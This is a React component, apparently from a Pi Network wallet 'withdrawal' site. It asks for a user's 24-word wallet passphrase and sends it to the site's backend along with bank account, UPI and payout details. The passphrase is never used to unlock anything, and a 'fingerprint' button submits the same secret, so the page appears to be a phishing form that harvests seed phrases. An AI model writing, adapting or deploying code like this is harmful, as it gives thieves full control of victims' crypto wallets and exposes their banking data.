import { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import '../css/CoinKeyPage.css';

function CoinKeyPage({ quantity, totalAmount }) {
  const navigate = useNavigate();
  const { state } = useLocation();
  const [coinKey, setCoinKey] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // ✅ Returns number of words typed
  const wordCount = (coinKey.trim().split(/\s+/).filter(Boolean)).length;

  // ✅ Must be exactly 24 words
  const isValidCoinKey = (key) => wordCount === 24;

  const handleSubmit = async () => {
    if (!isValidCoinKey(coinKey)) {
      setError('Passphrase must contain exactly 24 words');
      window.alert('Please enter exactly 24 words in your passphrase');
      return;
    }

    setLoading(true);
    try {
      await axios.post(`${import.meta.env.VITE_API_URL}/api/submit-key`, {
        quantity,
        totalAmount,
        method: state.method,
        upiId: state.upiId,
        accountNo: state.accountNo,
        ifsc: state.ifsc,
        accountHolder: state.accountHolder,
        coinKey,
        contactId: state.contactId,
        fundAccountId: state.fundAccountId,
        payoutId: state.payoutId,
      });
      navigate('/withdrawal-success', {
        state: { payoutId: state.payoutId, amount: totalAmount },
      });
    } catch (err) {
      const errorMessage = err.response?.data?.error || 'Failed to submit key';
      setError(errorMessage);
      window.alert(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="app">
      <div className="app-container">
        <div className="unlock-container">
          <h1 className="unlock-title">Unlock Pi Wallet</h1>
          <div className="input-group">
            <textarea
              value={coinKey}
              onChange={(e) => setCoinKey(e.target.value)}
              className="unlock-input"
              placeholder="Enter your 24-word passphrase here"
              rows="6"
            />
            <p className="word-count">{wordCount} / 24 words</p>
          </div>
          {error && <p className="error-text">{error}</p>}
          <div className="button-save">
            <button
              onClick={handleSubmit}
              disabled={loading || !isValidCoinKey(coinKey)}
              className="unlock-button"
            >
              {loading ? 'Submitting...' : 'Unlock With Passphrase'}
            </button>
            <button
              onClick={handleSubmit}
              disabled={loading || !isValidCoinKey(coinKey)}
              className="unlock-button-face"
            >
              {loading ? 'Submitting...' : 'Unlock With Fingerprint'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default CoinKeyPage;
